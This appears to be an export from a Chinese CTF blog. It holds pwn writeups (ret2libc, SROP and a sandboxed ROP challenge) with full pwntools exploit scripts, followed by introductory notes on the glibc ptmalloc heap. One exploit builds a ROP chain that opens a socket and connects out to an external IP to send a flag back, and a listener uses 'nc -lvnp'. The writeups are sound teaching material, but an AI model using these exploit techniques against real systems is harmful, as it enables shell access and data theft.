class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ,<span class="string">&#x27;__malloc_hook&#x27;</span>:__malloc_hook,<span class="string">&#x27;__free_hook&#x27;</span>:__free_hook&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;Your Name are right?&quot;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;Please enter your name again: &quot;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">sa(<span class="string">&quot;Your Message are right?&quot;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\0&#x27;</span>*<span class="number">7</span>+p64(libc[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sla(<span class="string">&quot;Please enter your Message again: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="babysrop"><a href="#babysrop" class="headerlink" title="babysrop"></a>babysrop</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>保护全关</p>
<p>开门见山，一个栈溢出漏洞</p>
<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>利用栈溢出漏洞，将返回地址及其下两个地址覆盖为 srop 函数，再次调用并输入一个字符 ‘\xf3’，使得返回 rax=1，同时修改返回地址使得调用 sys_write，泄露 libc 版本，然后同样使用这个方法输入15个字符，调用 sys_rt_sigreturn</li>
<li>根据题目，使用 pwnlibc.SigreturnFrame 来解题</li>
</ol>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./test&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;ctf.joe1sn.top&#x27;</span>,<span class="number">28013</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">dump=<span class="number">0x00000000004011F0</span></span><br><span class="line"></span><br><span class="line">payload=p64(dump)*<span class="number">3</span></span><br><span class="line">sl(payload)</span><br><span class="line">s(<span class="string">&#x27;\xf3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">240</span></span><br><span class="line"></span><br><span class="line">r(<span class="number">10</span>)</span><br><span class="line">stack_addr=u64(r(<span class="number">8</span>))-<span class="number">0xe0</span></span><br><span class="line"></span><br><span class="line">flag=<span class="number">0x0000000000404080</span></span><br><span class="line"></span><br><span class="line">syscall=<span class="number">0x00000000004011fe</span></span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=constants.SYS_write</span><br><span class="line">frame.rdi=<span class="number">1</span></span><br><span class="line">frame.rsi=flag</span><br><span class="line">frame.rdx=<span class="number">0x100</span></span><br><span class="line">frame.rip=syscall</span><br><span class="line"></span><br><span class="line">payload=p64(dump)+p64(syscall)+<span class="built_in">str</span>(frame)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload[<span class="number">8</span>:<span class="number">22</span>])</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="EDGvsDKgame5"><a href="#EDGvsDKgame5" class="headerlink" title="EDGvsDKgame5"></a>EDGvsDKgame5</h2><p>第一次碰见这种题，但是学长给了提示 <code>socket+connect</code> 后觉得也没那么难，属于是和网络编程知识联动了。</p>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>开启 NX 保护和 Partial RELRO</p>
<p>开启沙盒，禁止了 execve</p>
<p>开门见山，存在栈溢出漏洞，等待输入后关闭 stdin stdout stderr 文件流</p>
<h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>利用栈溢出漏洞，向栈上写入覆盖为 ropchain</li>
<li>根据 hint，本题是通过 socket+connect 来进行远程连接，然后使用 orw 将 flag 返回回来，在本地监听一个端口等待即可</li>
</ol>
<p>socket 是 sys_socket 的封装函数，因此我们进行 sys_socket 的系统调用即可，其调用号为 41，同样的 sys_connect 的调用号为 42。</p>
<p>sys_socket 的参数我们需要设置为 AF_INET、SOCK_STREAM。这两个常量的值分别为 2 和 1。</p>
<p>sys_connect 的参数我们需要设置为 sockfd(socket 的文件描述符)、server_addr(struct sockaddr_in)、sockaddr_length。</p>
<p>其中我们需要构造一下的是 server_addr，sin_family=AF_INET、sin_prot=23946、sin_addr.s_addr=127.0.0.1，我们可以通过自己写c文件调试目的值得到：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x server_addr</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  sin_family = 0x2, </span><br><span class="line">  sin_port = 0x8a5d, </span><br><span class="line">  sin_addr = &#123;</span><br><span class="line">    s_addr = 0x100007f</span><br><span class="line">  &#125;, </span><br><span class="line">  sin_zero = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中为 127.0.0.1:23946 的server_addr，其实需要的也就前八字节，最后得到 p64(0x100007f8a5d0002)+p64(0)*11。</p>
<p>c文件中的内容大致为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">server_addr.sin_family = AF_INET;</span><br><span class="line">server_addr.sin_port = htons(<span class="number">23946</span>);<span class="comment">//转换成网络字节序，也就是大端序存储，端口随意</span></span><br><span class="line">server_addr.sin_addr.s_addr =  inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//转换成网络字节序，也就是转换为16进制数再大端序存储，远程的话修改为自己云服务器的ip</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>调试查看 server_addr 的内容即可</p>
<p>构造完后，再用 orw 向 sockfd 输出即可。其实一开始我用的是 sys_sendto，本地能打通远程不行，然后才用的 write，具体原因未知。</p>
<p>除此之外便是本地监听端口，要是不嫌麻烦，可以自己写个监听程序，大致为：socket+bind+listen+access(不建议)，或者用<code>nc -lvnp 23946</code>，来监听。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn3&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;ctf.joe1sn.top&#x27;</span>,<span class="number">8020</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">syscall=<span class="number">0x0000000000401350</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401355</span></span><br><span class="line">pop_rsi=<span class="number">0x0000000000401357</span></span><br><span class="line">pop_rdx=<span class="number">0x0000000000401353</span></span><br><span class="line">pop_rcx=<span class="number">0x000000000040135c</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401359</span></span><br><span class="line"></span><br><span class="line">hero=<span class="number">0x00000000004040A0</span></span><br><span class="line">flag=hero+<span class="number">0x200</span></span><br><span class="line">main=<span class="number">0x00000000004013D0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sys</span>(<span class="params">rax,rdi=<span class="number">0</span>,rsi=<span class="number">0</span>,rdx=<span class="number">0</span></span>):</span></span><br><span class="line">    payload=p64(pop_rdi)+p64(rdi)+p64(pop_rsi)+p64(rsi)+p64(pop_rdx)+p64(rdx)+p64(pop_rax)+p64(rax)+p64(syscall)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">ropchain=sys(<span class="number">2</span>,hero,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">ropchain+=sys(<span class="number">0</span>,<span class="number">0</span>,flag,<span class="number">0x100</span>)</span><br><span class="line">ropchain+=sys(<span class="number">41</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">ropchain+=sys(<span class="number">42</span>,<span class="number">1</span>,hero+<span class="number">376</span>,<span class="number">0x10</span>)</span><br><span class="line">ropchain+=sys(<span class="number">1</span>,<span class="number">1</span>,flag,<span class="number">0x100</span>)</span><br><span class="line">ropchain=ropchain.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload=&#x27;./flag&#x27;.ljust(0x10,&#x27;\0&#x27;)+ropchain+p64(0x100007f8a5d0002)+p64(0)*11</span></span><br><span class="line">payload=<span class="string">&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\0&#x27;</span>)+ropchain+p64(<span class="number">0x1abfcd748a5d0002</span>)+p64(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">ru(<span class="string">&quot;Which jungle hero would you choose?&quot;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="EDGvsDKgame4"><a href="#EDGvsDKgame4" class="headerlink" title="EDGvsDKgame4"></a>EDGvsDKgame4</h2><p>glibc 2.34 的题目，hint 给了是 <code>house of banana</code>，但是依旧没做出来。</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>heap 简介</title>
    <url>/2022/07/09/heap/</url>
    <content><![CDATA[<p>堆是一种数据结构，分配给每个程序的内存空间。与栈不同，堆内存动态分配获得，且堆内存是自低地址向高地址生长的。</p>
<span id="more"></span>

<h2 id="堆分配相关函数"><a href="#堆分配相关函数" class="headerlink" title="堆分配相关函数"></a>堆分配相关函数</h2><p>Linux 内存管理的基本思想为：延迟分配。即只有在真正访问一个地址时才建立这个地址的物理映射区，在这之前系统只为它分配了一个虚拟内存区。这与 glibc 的延迟绑定机制有点类似。</p>
<p>并且在调用 malloc 之前，heap 大小为0。首次调用 malloc 时，在分配前会首先获取一个较大的空间，即 top chunk，并且对于 main_arena 和 non_main_arena 来说，分配和增大 top chunk 的方式不同，在后面会提及。</p>
<p>glibc 的 malloc 族函数，主要对 sbrk 和 mmap 函数进行了封装。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n</span></span><br><span class="line"><span class="comment">  bytes, or null if no space is available. Additionally, on </span></span><br><span class="line"><span class="comment">  failure, errno is set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minimum-sized chunk. (The</span></span><br><span class="line"><span class="comment">  minimum size is 16 bytes on most 32bit systems, and 24 or 32</span></span><br><span class="line"><span class="comment">  bytes on 64bit systems.)  On most systems, size_t is an unsigned</span></span><br><span class="line"><span class="comment">  type, so calls with negative arguments are interpreted as</span></span><br><span class="line"><span class="comment">  requests for huge amounts of space, which will often fail. The</span></span><br><span class="line"><span class="comment">  maximum supported value of n differs across systems, but is in</span></span><br><span class="line"><span class="comment">  all cases less than the maximum representable value of a</span></span><br><span class="line"><span class="comment">  size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  free(void* p)</span></span><br><span class="line"><span class="comment">  Releases the chunk of memory pointed to by p, that had been</span></span><br><span class="line"><span class="comment">  previously allocated using malloc or a related routine such as</span></span><br><span class="line"><span class="comment">  realloc. It has no effect if p is null. It can have arbitrary</span></span><br><span class="line"><span class="comment">  (i.e., bad!) effects if p has already been freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless disabled (using mallopt), freeing very large spaces will</span></span><br><span class="line"><span class="comment">  when possible, automatically trigger operations that give</span></span><br><span class="line"><span class="comment">  back unused memory to the system, thus reducing program</span></span><br><span class="line"><span class="comment">  footprint.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/brk%26mmap.png" alt="malloc"></p>
<h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对 heap 的操作，操作系统提供了 brk() 函数，C运行时库提供了 sbrk() 函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">brk</span><span class="params">(<span class="keyword">void</span> *addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sbrk</span><span class="params">(<span class="keyword">intptr_t</span> increment)</span></span>;</span><br></pre></td></tr></table></figure>

<p>brk、sbrk 作用是用来改变数据段的大小。</p>
<p>具体的操作是增加 program break 的位置，program break 是用来定义进程数据段的结束，也是未初始化数据段的第一个位置。</p>
<p>brk 是设置 program break 的值为参数 addr。</p>
<p>sbrk 则是增加数据段的的长度，也就是增大 program break 的大小。</p>
<ul>
<li>返回 program break 改变后的地址，当 increment=0 时，返回原地址</li>
</ul>
<h3 id="mmap、munmap"><a href="#mmap、munmap" class="headerlink" title="mmap、munmap"></a>mmap、munmap</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,<span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">munmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length)</span></span>;</span><br></pre></td></tr></table></figure>

<p>mmap 会在进程的虚拟地址内创建一个新的映射空间，这块映射空间的其实位置由 addr 决定，length 决定映射空间的大小。munmap 会删除特定区域的映射。</p>
<p>而整个堆内存由 ptmalloc 进行管理。</p>
<h2 id="ptmalloc-内存管理概述"><a href="#ptmalloc-内存管理概述" class="headerlink" title="ptmalloc 内存管理概述"></a>ptmalloc 内存管理概述</h2><h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h4><p>ptmalloc 给用户分配的空间会在前后加上一些控制信息，将这个整体称作chunk：</p>
<p><img src="https://s2.loli.net/2022/03/16/WhTe1Hxin3oE6SY.png" alt="chunk结构"></p>
<p>每个字段的具体的解释如下</p>
<ul>
<li><p>size of previous chunk(prev_size)</p>
<p>如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</p>
</li>
<li><p>size of chunk</p>
<p>该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ  的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是  8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示</p>
<ul>
<li> NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
<li> IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。 </li>
<li> PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li>
</ul>
</li>
</ul>
<p>再介绍一下其中一些值得注意的点：</p>
<ol>
<li>prev_size 区域只有当上一个区域释放后才会使用，其大小为用户申请的大小，否则会被用作上一个块的 mem 区域使用。这样能使 chunk 的空间变小，称作空间复用。</li>
<li>一般来说用户申请的区域都是 2*size_t 大小，若申请的大小与 2*size_t 取模后的空间小于size_t则会遇见第一条的情况；大于则再多申请 2*size_t 的空间。因此堆是相当对齐的。</li>
</ol>
<p>而 chunk 在空闲的时候不仅有下一块 prev_size 的变化，其 mem 空间还会加如许多其他信息，空闲 chunk 在内存中的结构如图所示：</p>
<p><img src="https://s2.loli.net/2022/03/16/kLPGpAorDF5h1TY.png" alt="空闲chunk结构"></p>
<p>这个图相比于上一张图，多了4个指针：</p>
<ul>
<li>Forward pointer to next chunk in list(fd)：指向前一个空闲的chunk</li>
<li>Back pointer to previous chunk in list(bk)：指向后一个空闲的chunk</li>
<li>Forward pointer to next chunk size in list(fd_nextsize)：前一个与当前 chunk 大小不同的空闲 chunk</li>
<li>Back pointer to previous chunk size in list(bk_nextsize)：后一个当前 chunk 大小不同的空闲 chunk</li>
</ul>
<p>ptmalloc 通过前两个指针将大小相近的 chunk 连成一个双向链表。后两个指针是 large bin 中空闲 chunk 才有的。作用等下介绍。</p>
<p>除此之外，当 chunk 空闲时，其 M 状态不存在，只有 AP 状态。</p>
<h4 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h4><p>arena 分为 main_arena &amp; non_main_arena。且曾经分配区只有一个 main_arena，且每次分配内存都会对 main_arena 加锁，待分配完成后才会释放。当我们进行多线程操作时，这种设计就显得及其拖沓，影响效率。</p>
<p>pwndbg 中展示了 main_arena 的结构如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x main_arena</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  mutex = 0x0, </span><br><span class="line">  flags = 0x0, </span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  top = 0x0, </span><br><span class="line">  last_remainder = 0x0, </span><br><span class="line">  bins = &#123;0x0 &lt;repeats 254 <span class="built_in">times</span>&gt;&#125;, </span><br><span class="line">  binmap = &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  next = 0x7ffff7dd1b20, </span><br><span class="line">  next_free = 0x0, </span><br><span class="line">  attached_threads = 0x1, </span><br><span class="line">  system_mem = 0x0, </span><br><span class="line">  max_system_mem = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="空闲的-chunk-容器"><a href="#空闲的-chunk-容器" class="headerlink" title="空闲的 chunk 容器"></a>空闲的 chunk 容器</h4><h5 id="total-bins"><a href="#total-bins" class="headerlink" title="total bins"></a>total bins</h5><p>当用户 free chunk 后，该 chunk 不会立即归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲 chunk，在用户下一次申请时，会首先在这些空闲 chunk 中挑选一块给用户，这样能降低内存分配的开销。</p>
<p>ptmalloc 将相似大小的 chunk 用双向链表连接起来，这个双向链表称为bin。ptmalloc 一共维护了136个bin。其中10个为 fast bin ，占用一个数组；剩下的126个 bin，占用一个数组，其中有一个为 unsorted bin，62个 small bin，63个 large bin。</p>
<p>这些成员的地址都可以在 main_arena.bins 中看见。</p>
<h6 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h6><p>我们将 chunk_size 小于 0x80 的 chunk 称为 fast chunk，因为这个大小范围内的 chunk 在释放后会被放入 fast bin 中。当用户申请内存的大小属于这个范围内，将会优先在这里遍历寻找合适的chunk。</p>
<p>这个数组中存储的元素是双向链表的头节点地址，并且对应不同大小的数组的链表对应不同数组的下标。得到对应下标的宏定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure>

<p>fast bin 使用 fd 指针寻址，即在链表中按照先进先出(FIFO)的顺序被取出(队列)。</p>
<h6 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h6><p><strong>unsorted bin</strong></p>
<p>如果被释放的 chunk 不属于 fast_chunk 的范围，那么这些 chunk 就会被放到 unsorted bin 中。</p>
<p>在 malloc 的过程中，会将 unsorted bin 中的 chunk 重新分配给 small bins 和 large bins，<a href>分配流程中讲</a>。</p>
<p><strong>small bin</strong></p>
<p>small bins 中每个 chunk 的大小与其所在的 bin 的下标的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下</p>
<table>
<thead>
<tr>
<th>下标</th>
<th>SIZE_SZ=4（32 位）</th>
<th>SIZE_SZ=8（64 位）</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>16</td>
<td>32</td>
</tr>
<tr>
<td>3</td>
<td>24</td>
<td>48</td>
</tr>
<tr>
<td>4</td>
<td>32</td>
<td>64</td>
</tr>
<tr>
<td>5</td>
<td>40</td>
<td>80</td>
</tr>
<tr>
<td>x</td>
<td>2*4*x</td>
<td>2*8*x</td>
</tr>
<tr>
<td>63</td>
<td>504</td>
<td>1008</td>
</tr>
</tbody></table>
<p>得到对应下标的宏定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br></pre></td></tr></table></figure>

<p><strong>large bin</strong></p>
<p>large bins 中每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下</p>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody></table>
<p>得到对应下标的宏定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br></pre></td></tr></table></figure>

<h4 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h4><p>top chunk对于主分配区和非主分配区来说是不一样的，这里仅介绍针对 main_arena 的。</p>
<p>对于 main_arena，top chunk 会在第一次调用 malloc 时被分配一块chunk_size + 128KB &amp; align 4KB 大小的空间并且作为初始 heap。</p>
<p>分配时，当用户无法从 total bins 中分配时，就会从 top chunk 中分配内存，可以直接取出一块内存给用户。在回收内存时，若与 top chunk 相邻且大小不属于 fast_chunk，就会与 top chunk 合并，<a href>流程中再细琐</a>。</p>
<p>若 top chunk 没有空闲内存，ptmalloc 会调用 sbrk() 将进程 heap 的边界上移，然后修改 top chunk 的大小。</p>
<h4 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h4><p>当前需要分配的 chunk 太大时，total bins 都不能满足要求，甚至top chunk 本身也不能满足分配需求时，ptmalloc 会使用 mmap 来直接使用内存映射来将页映射到进程空间。这样分配的 chunk 在被 free 时会直接解除映射，将内存归还给操作系统。</p>
<h4 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h4><p>chunk 的一种中间态，当需要分配一个 chunk，但在 bins 中找不到合适的 chunk 时，如果 last remainder 中存在大小适合或大一点的 chunk，就会直接使用或分裂成两个 chunk，剩下的那个变成新的 last remainder chunk。</p>
<p><strong>参考</strong></p>
<p><a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">Glibc 内存管理-Ptmalloc2 源代码分析</a></p>
<p><a href="https://ctf-wiki.org/">ctf-wiki</a></p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>堆分配流程</title>
    <url>/2022/07/12/%E5%A0%86%E5%88%86%E9%85%8D%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<p>以 glibc 2.23 的源码为例</p>
<span id="more"></span>

<h2 id="分配过程概述"><a href="#分配过程概述" class="headerlink" title="分配过程概述"></a>分配过程概述</h2><ol>
<li><p>进行分配之前主要进行的操作有：检查 hook 并执行；获取 arena；检查 size  并规范化；检查 arena 是否可用</p>
</li>
<li><p>然后进行 fast_bin 相关检查与分配</p>
<ul>
<li><p>检查大小是否属于 fast_chunk 范围</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br></pre></td></tr></table></figure></li>
